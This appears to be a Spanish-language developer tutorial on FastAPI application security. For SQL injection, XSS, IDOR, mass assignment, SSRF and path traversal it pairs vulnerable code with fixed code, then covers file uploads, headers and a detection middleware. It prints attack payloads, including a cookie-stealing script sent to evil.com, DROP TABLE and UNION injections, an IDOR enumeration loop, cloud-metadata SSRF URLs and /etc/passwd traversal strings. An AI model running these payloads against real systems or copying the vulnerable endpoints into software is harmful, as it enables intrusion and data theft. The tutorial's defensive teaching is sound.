SQL Injection

El input del usuario se concatena directamente en una query SQL. El atacante cierra el string e inyecta SQL propio. Con SQLAlchemy ORM estás protegido por defecto. El peligro está en text() con f-strings.

Payloads del atacante en ?q=' OR '1'='1 '; DROP TABLE users; -- ' UNION SELECT email,password,3 FROM users-- admin'--

La segunda línea borra toda la tabla. La tercera extrae emails y passwords. SQLMap automatiza esto en segundos.

✓ Defensa: ORM parametrizado siempre. Si necesitas text(), usa bindparams. Pydantic valida tipos antes de la query. Nunca mostrar errores de DB al cliente.
✗ VULNERABLE — SQL Injection 
# NUNCA hacer esto
@router.get("/search")
async def search(q: str, db=Depends(get_db)):
    raw = f"SELECT * FROM users WHERE name='{q}'"
    result = await db.execute(text(raw))
    return result.fetchall()

# q = "' OR '1'='1" → devuelve TODO
✓ SEGURO — ORM parametrizado 
@router.get("/search")
async def search(
    q: str = Query(max_length=100,
               pattern=r"^[a-zA-Z0-9 _-]+$"),
    db=Depends(get_db),
    _=Depends(get_current_user),
):
    result = await db.execute(
        select(User).where(
            User.name.ilike(f"%{q}%")
        )
    ) # SQLAlchemy escapa automáticamente
    return result.scalars().all()

Cross-Site Scripting

Tu API almacena o refleja HTML/JavaScript del usuario sin escapar. Cuando otro usuario ve ese contenido, el script malicioso corre en su navegador con acceso a sus cookies y tokens.

Payloads XSS clásicos<script>fetch('https://evil.com?c='+document.cookie)</script> <img src=x onerror="document.location='//attacker.com'"> <svg/onload=alert(document.domain)> javascript:eval(atob('BASE64_MALICIOSO'))

El robo de tokens vía XSS es la forma más común de account takeover. Con el access_token, el atacante se autentica como esa persona indefinidamente.

✓ Defensa: API JSON nunca renderiza HTML. Content-Security-Policy header. X-Content-Type-Options: nosniff. Sanitizar con bleach si aceptas HTML del usuario.
✗ VULNERABLE — reflejo sin escapar 
@router.get("/profile/{name}")
async def profile(name: str):
    return HTMLResponse(
        f"<h1>Perfil de {name}</h1>"
    )  # name = "<script>...</script>"

# Stored XSS: guardar sin sanitizar
bio = user_input  # sin sanitizar
return {"bio": bio}  # frontend lo renderiza
✓ SEGURO — sanitización con bleach 
# pip install bleach
import bleach

ALLOWED_TAGS = ["b", "i", "em", "strong"]

class UserUpdate(BaseModel):
    bio: str = Field(max_length=500)

    @field_validator("bio")
    @classmethod
    def sanitize_bio(cls, v):
        return bleach.clean(
            v, tags=ALLOWED_TAGS, strip=True
        )

# Content-Security-Policy: default-src 'self'

IDOR — Insecure Direct Object Reference

El endpoint recibe un ID del usuario y lo usa sin verificar que tiene derecho a ese objeto. El atacante itera IDs secuenciales y extrae datos de todos los usuarios.

Script de ataque IDORfor i in $(seq 1 10000); do curl -H "Authorization: Bearer $MY_TOKEN" \ /api/v1/orders/$i >> dump.json done # extrae 10,000 órdenes de otros usuarios

IDOR es la vulnerabilidad más reportada en bug bounty. Es fácil de explotar, devastadora para la privacidad, y muy fácil de prevenir con un check de propiedad.

✓ Defensa: verify_ownership() en cada endpoint. Usar UUIDs en lugar de IDs secuenciales. Test explícito de IDOR en pytest.
✗ VULNERABLE — sin verificación 
@router.get("/orders/{order_id}")
async def get_order(
    order_id: int, db=Depends(get_db)
):
    order = await db.get(Order, order_id)
    if not order:
        raise HTTPException(404)
    return order  # cualquier usuario ve todo
✓ SEGURO — ownership verificado 
async def verify_ownership(resource, user):
    if not resource:
        raise HTTPException(404)
    is_owner = resource.user_id == user.id
    is_admin = user.is_admin
    if not (is_owner or is_admin):
        raise HTTPException(403,"Acceso denegado")
    return resource

@router.get("/orders/{order_id}")
async def get_order(
    order_id: int,
    user=Depends(get_current_user),
    db=Depends(get_db),
):
    order = await db.get(Order, order_id)
    return await verify_ownership(order, user)

Mass Assignment

El usuario envía campos extra en el JSON body que no deberían ser modificables — como is_admin: true o credits: 999999. Si el ORM acepta todo sin filtrar, el atacante escala privilegios instantáneamente.

Body del atacante al registrar{"username": "hacker", "email": "h@x.com", "password": "pass", "is_admin": true, "credits": 99999, "role": "superuser"}

Pydantic previene esto si defines schemas estrictos. El error es usar el modelo ORM directamente como schema de entrada.

✓ Defensa: schemas separados para input (UserCreate) y output (UserResponse). Nunca aceptar el modelo ORM completo como input. model_dump(exclude_unset=True) en PATCH.
✗ VULNERABLE — sin schema 
@router.post("/users")
async def create_user(body: dict, db=...):
    user = User(**body)  # acepta cualquier campo
    db.add(user)         # is_admin=True se guarda!
    return user

# También peligroso:
return user.__dict__  # incluye hashed_password!
✓ SEGURO — schemas estrictos

    email: EmailStr
    username: str = Field(min_length=3,max_length=50)
    password: str = Field(min_length=8)
    # is_admin NO está → no puede enviarlo

Server-Side Request Forgery

Tu servidor hace requests HTTP a URLs que controla el atacante. En AWS, la URL http://169.254.169.254/latest/meta-data/iam/ devuelve credenciales IAM del servidor. Con esas credenciales, acceso total a tu infraestructura.

URLs que el atacante puede inyectarhttp://169.254.169.254/latest/meta-data/iam/ http://metadata.google.internal/computeMetadata/v1/ http://localhost:5432/ ← tu PostgreSQL interno http://redis:6379/ ← tu Redis interno file:///etc/passwd ← archivos del sistema

SSRF convierte tu servidor en un proxy para atacar servicios internos inaccesibles desde internet.

✓ Defensa: allowlist de dominios permitidos. Bloquear IPs privadas (169.254.x.x, 10.x.x.x, 172.16.x.x, 192.168.x.x) y localhost. Nunca fetch a URLs del usuario sin validar.
✗ VULNERABLE — URL sin validar 
@router.post("/fetch-preview")
async def fetch_preview(url: str):
    async with httpx.AsyncClient() as c:
        resp = await c.get(url)  # ← SSRF total
    return {"content": resp.text}
# url = "http://169.254.169.254/..."
# → devuelve credenciales AWS del servidor
✓ SEGURO — validación estricta 
import ipaddress
from urllib.parse import urlparse

ALLOWED = {"example.com", "api.trusted.com"}

def validate_url(url: str) -> str:
    p = urlparse(url)
    if p.scheme not in ("http","https"):
        raise ValueError("Solo HTTP/HTTPS")
    if p.hostname not in ALLOWED:
        raise ValueError("Dominio no permitido")
    try:
        ip = ipaddress.ip_address(p.hostname)
        if ip.is_private or ip.is_loopback:
            raise ValueError("IP privada")
    except ValueError: pass
    return url

Path Traversal

El atacante usa ../ en nombres de archivo para navegar fuera del directorio permitido y leer archivos del sistema como /etc/passwd o tus propios archivos de configuración con secrets.

Payloads de Path TraversalGET /api/v1/files?name=../../../etc/passwd GET /api/v1/files?name=....//....//etc/shadow name=%2e%2e%2f%2e%2e%2fetc%2fpasswd (URL encoded) name=../app/core/config.py ← tus secrets

Especialmente peligroso en endpoints de descarga. Si tienes avatares o documentos, este es el primer vector a cerrar.

✓ Defensa: pathlib.Path.resolve() + verificar que el path final está dentro del directorio base. Nunca confiar en nombres de archivo del usuario. Siempre renombrar con UUID.
✗ VULNERABLE — path directo 
@router.get("/files/download")
async def download(filename: str):
    path = f"/uploads/{filename}"
    return FileResponse(path)
# filename = "../../../etc/passwd"
# path real = "/etc/passwd" ← expuesto
✓ SEGURO — path confinado 
from pathlib import Path

UPLOAD_DIR = Path("/app/uploads").resolve()

def safe_path(filename: str) -> Path:
    candidate = (UPLOAD_DIR / filename).resolve()
    if not str(candidate).startswith(str(UPLOAD_DIR)):
        raise HTTPException(400,"Ruta no permitida")
    if not candidate.exists():
        raise HTTPException(404)
    return candidate

@router.get("/files/download")
async def download(filename: str):
    return FileResponse(safe_path(filename))

from pydantic import BaseModel, EmailStr, Field, field_validator
import re

class UserCreate(BaseModel):
    email: EmailStr                           # valida RFC 5322
    username: str = Field(
        min_length=3, max_length=50,
        pattern=r"^[a-zA-Z0-9_-]+$"          # solo chars seguros
    )
    age: int = Field(ge=1, le=120)           # ge=≥1, le=≤120
    password: str = Field(min_length=8, max_length=128)

    @field_validator("password")
    @classmethod
    def strong_password(cls, v: str) -> str:
        if not re.search(r"[A-Z]", v): raise ValueError("Falta mayúscula")
        if not re.search(r"\d", v):   raise ValueError("Falta número")
        if not re.search(r"[!@#$%]", v): raise ValueError("Falta símbolo")
        return v

    @field_validator("username")
    @classmethod
    def not_reserved(cls, v: str) -> str:
        reserved = {"admin", "root", "system", "api"}
        if v.lower() in reserved:
            raise ValueError("Username reservado")
        return v.lower()

// sección 04 — subida de archivos

File Upload:
el vector más subestimado

Un endpoint de subida mal implementado puede comprometer todo el servidor. Cada paso tiene su propio vector de ataque.

01
Extensión
Verificar la extensión del archivo. Pero la extensión es solo cosmética — un ejecutable puede llamarse malware.jpg. Necesario pero no suficiente.
Primer filtro
02
MIME Type
El header Content-Type lo envía el cliente — puede ser falso. python-magic lee los primeros bytes del archivo (magic bytes) y detecta el tipo real, no el declarado.
Magic bytes
03
Tamaño
Sin límite de tamaño, el atacante sube archivos de varios GB para agotar disco y memoria — DoS. Limitar en FastAPI con UploadFile.read(MAX_SIZE+1) y en Nginx con client_max_body_size.
Límite estricto
04
Nombre
El nombre original nunca debe usarse para guardar. ../../etc/cron.daily/backdoor.sh es un nombre de archivo válido. Siempre renombrar con UUID generado internamente.
UUID siempre
05
Contenido
Para imágenes: reprocesar con Pillow. Abrir y re-guardar elimina payloads en metadatos EXIF y cualquier contenido malicioso embebido. Una imagen que pasa por Pillow.save() es limpia.
Re-procesar
06
Almacenamiento
Nunca guardar uploads en el mismo directorio que el código. Usar S3 / R2 / MinIO — separación completa. Los archivos no son ejecutables en S3. URLs firmadas con expiración para acceso.
Object Store
✓ Endpoint de upload seguro completo 
# pip install python-magic Pillow
import magic, uuid, io
from fastapi import UploadFile, File, HTTPException
from PIL import Image
from pathlib import Path

UPLOAD_DIR = Path("/app/uploads")
MAX_SIZE   = 5 * 1024 * 1024  # 5 MB
ALLOWED    = {"image/jpeg", "image/png", "image/webp"}

@router.post("/upload/avatar")
@limiter.limit("10/hour")
async def upload_avatar(
    file: UploadFile = File(...),
    user=Depends(get_current_user),
):
    # 1. Leer con límite de tamaño
    content = await file.read(MAX_SIZE + 1)
    if len(content) > MAX_SIZE:
        raise HTTPException(413, "Máximo 5MB")

    # 2. Verificar magic bytes (ignora Content-Type del cliente)
    real_type = magic.from_buffer(content, mime=True)
    if real_type not in ALLOWED:
        raise HTTPException(422, f"Tipo no permitido: {real_type}")

    # 3. Re-procesar con Pillow (elimina payloads embebidos)
    try:
        img = Image.open(io.BytesIO(content))
        img.verify()
        img = Image.open(io.BytesIO(content))
        img = img.convert("RGB")
        img.thumbnail((800, 800))
    except Exception:
        raise HTTPException(422, "Imagen inválida")

    # 4. Guardar con UUID (NUNCA el nombre original)
    safe_name = f"{uuid.uuid4()}.jpg"
    output = io.BytesIO()
    img.save(output, format="JPEG", quality=85)
    # → enviar a S3 / MinIO
    return {"filename": safe_name, "size": output.tell()}

// sección 05 — headers HTTP

Security Headers:
la capa invisible

Cada header es una instrucción al navegador. Juntos forman una capa de defensa sin código adicional en el frontend.

Content-Security-Policy
default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self' data: https:; frame-ancestors 'none'
El más importante. Controla exactamente qué recursos puede cargar el navegador. Previene XSS bloqueando scripts no autorizados.
OBLIGATORIO
Strict-Transport-Security
max-age=31536000; includeSubDomains; preload
Fuerza HTTPS por 1 año aunque el usuario escriba http://. Previene SSL stripping. preload lo incluye en la lista de navegadores.
OBLIGATORIO
X-Content-Type-Options
nosniff
Previene MIME type sniffing. El navegador no puede interpretar un archivo de texto como JavaScript ejecutable.
OBLIGATORIO
X-Frame-Options
DENY
Previene clickjacking. Tu página no puede ser embebida en un iframe de otro dominio para engañar usuarios.
OBLIGATORIO
Permissions-Policy
camera=(), microphone=(), geolocation=(), interest-cohort=()
Deshabilita APIs del navegador que tu app no necesita. Un XSS no puede acceder a la cámara si el header lo prohíbe.
IMPORTANTE
Referrer-Policy
strict-origin-when-cross-origin
Controla qué URL se envía en el header Referer. Evita que URLs con tokens se filtren a sitios externos.
IMPORTANTE
Server
(vacío — eliminar)
Por defecto revela "uvicorn/0.29.0". Elimínalo — el atacante no debe saber qué tecnología usas ni la versión exacta.
IMPORTANTE
Cross-Origin-Opener-Policy
same-origin
Aísla tu página en su propio contexto de navegación. Mitiga ataques Spectre y acceso cross-origin al window object.

// sección 07 — patrones

Patrones de
código seguro

Decisiones de diseño que previenen clases enteras de vulnerabilidades antes de que existan.

01
🔒
Deny by Default
Todo está bloqueado por defecto. Los endpoints requieren autenticación salvo que explícitamente se marquen como públicos.
router = APIRouter(
  dependencies=[Depends(get_current_user)]
)
# herencia automática de auth
02
📋
Allowlist, no Denylist
Define lo que se permite, no lo que se bloquea. Los denylist siempre tienen gaps. Define tipos permitidos explícitamente.
ALLOWED = {"image/jpeg","image/png"}
if mime_type not in ALLOWED:
  raise HTTPException(422)
03
🏷
Errores Genéricos
"Usuario no encontrado" vs "Credenciales inválidas" — el primero confirma que el usuario existe. Siempre el mensaje más genérico.
raise HTTPException(
  401,
  "Credenciales inválidas"
)# no "usuario no existe"
04
⌛
Constant-Time Compare
Las comparaciones normales filtran información por tiempo. Para tokens usar hmac.compare_digest que siempre tarda lo mismo.
import hmac
safe = hmac.compare_digest(
  user_token, expected_token
)# timing-safe
05
📝
Log sin datos sensibles
Los logs son el objetivo tras comprometer un sistema. Nunca loguear contraseñas, tokens, números de tarjeta. Loguear eventos, no datos.
logger.info(f"Login user_id={uid}")
# NO: f"Login {email} {password}"
06
🎯
Least Privilege en DB
El usuario de PostgreSQL solo tiene SELECT, INSERT, UPDATE, DELETE en las tablas que necesita. No CREATE, DROP ni system tables.
GRANT SELECT, INSERT, UPDATE, DELETE
  ON users TO cipher_user;
# NO: GRANT ALL ON *.*

# app/middleware/appsec.py
from starlette.middleware.base import BaseHTTPMiddleware
from starlette.requests import Request
from starlette.responses import Response
from loguru import logger
import time, secrets, re

class AppSecMiddleware(BaseHTTPMiddleware):

    SUSPICIOUS = [
        re.compile(r"\.\./|\.\.\\|%2e%2e", re.IGNORECASE),
        re.compile(r"union\s+select|drop\s+table", re.IGNORECASE),
        re.compile(r"<script|javascript:|onerror=", re.IGNORECASE),
    ]

    async def dispatch(self, request: Request, call_next) -> Response:
        start = time.time()
        req_id = secrets.token_hex(8)

        # 1. Detectar patrones sospechosos en URL
        full_path = str(request.url)
        for pattern in self.SUSPICIOUS:
            if pattern.search(full_path):
                logger.warning(
                    f"SUSPICIOUS id={req_id} ip={request.client.host} path={request.url.path}"
                )
                return Response("Bad Request", status_code=400)

        # 2. Content-Type en mutaciones
        if request.method in ("POST", "PUT", "PATCH"):
            ct = request.headers.get("content-type", "")
            if ("application/json" not in ct
                    and "multipart" not in ct
                    and "health" not in request.url.path):
                return Response("Unsupported Media Type", status_code=415)

        # 3. Procesar
        response = await call_next(request)
        elapsed = round((time.time() - start) * 1000, 2)

        # 4. Security headers
        nonce = secrets.token_urlsafe(16)
        response.headers.update({
            "Content-Security-Policy": (
                f"default-src 'self'; script-src 'nonce-{nonce}'; frame-ancestors 'none'"
            ),
            "Strict-Transport-Security": "max-age=31536000; includeSubDomains",
            "X-Content-Type-Options":    "nosniff",
            "X-Frame-Options":           "DENY",
            "Referrer-Policy":           "strict-origin-when-cross-origin",
            "Permissions-Policy":        "camera=(), microphone=()",
            "X-Request-ID":              req_id,
            "Server":                    "",
        })

        # 5. Log estructurado (sin datos sensibles)
        logger.info(
            f"REQUEST id={req_id} {request.method} {request.url.path}"
            f" status={response.status_code} ms={elapsed} ip={request.client.host}"
        )
        return response

        status_code=status.HTTP_401_UNAUTHORIZED,
        detail="Credenciales inválidas",  # genérico
        headers={"WWW-Authenticate": "Bearer"},
    )
    try:
        payload = jwt.decode(
            token,
            settings.SECRET_KEY,
            algorithms=["HS256"],  # explícito, nunca ["*"]
        )
        user_id = payload.get("sub")
        token_scopes = payload.get("scopes", [])
        if not user_id: raise error
    except JWTError: raise error

    # Verificar scopes requeridos
    for scope in scopes.scopes:
        if scope not in token_scopes:
            raise HTTPException(403, f"Scope '{scope}' requerido")

    user = await get_user_by_id(db, user_id)
    if not user or not user.is_active: raise error
    return user

from fastapi import FastAPI, Request, status
from fastapi.responses import JSONResponse
from fastapi.exceptions import RequestValidationError
from sqlalchemy.exc import SQLAlchemyError
from loguru import logger

def register_error_handlers(app: FastAPI):

    @app.exception_handler(RequestValidationError)
    async def validation_handler(request: Request, exc):
        Pydantic errors: qu&eacute; campo fall&oacute;, no el valor.
        errors = []
        for err in exc.errors():
            errors.append({
                "field": " > ".join(str(x) for x in err["loc"]),
                "msg": err["msg"],
                # NO incluir "input" — puede ser sensible
            })
        return JSONResponse(
            status_code=422,
            content={"detail": errors}
        )

    @app.exception_handler(SQLAlchemyError)
    async def db_handler(request: Request, exc):
        # DB errors: log internamente, genérico al cliente.
        logger.error(f"DB error: {exc}")
        return JSONResponse(
            status_code=500,
            content={"detail": "Error interno del servidor"}
            # NUNCA: str(exc) — revelaría tabla, columnas
        )

    @app.exception_handler(Exception)
    async def global_handler(request: Request, exc):
        logger.exception(f"Unhandled: {exc}")
        return JSONResponse(
            status_code=500,
            content={"detail": "Error interno del servidor"}
        )

ENTRADA #006 — CAPÍTULO 06 COMPLETADO

AppSec no es una checklist — es un cambio de mentalidad. Antes escribía código pensando en que funcionara. Ahora escribo pensando en cómo alguien intentaría romperlo. La diferencia entre un endpoint vulnerable y uno seguro a veces es una sola línea: pattern=r"^[a-zA-Z0-9_-]+$" en un Field de Pydantic.

El descubrimiento más valioso: pillow tenía CVEs activos en mi pyproject.toml y no lo sabía. Ejecutar pip-audit por primera vez es siempre revelador. Esto entra al CI/CD — cada PR verifica que no hay vulnerabilidades conocidas antes de mergear.
